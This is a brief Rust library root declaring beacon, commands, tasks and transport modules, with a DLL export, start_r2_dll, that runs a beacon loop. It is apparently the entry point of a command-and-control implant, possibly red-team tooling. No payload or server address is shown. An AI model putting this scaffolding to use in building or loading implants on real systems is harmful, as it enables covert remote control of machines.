pub mod beacon;
pub mod commands;
pub mod tasks;
pub mod transport;

#[cfg(feature = "dll")]
#[unsafe(no_mangle)]
pub extern "C" fn start_r2_dll() {
    if let Ok(rt) = tokio::runtime::Runtime::new() {
        rt.block_on(beacon::start_beacon());
    }
}
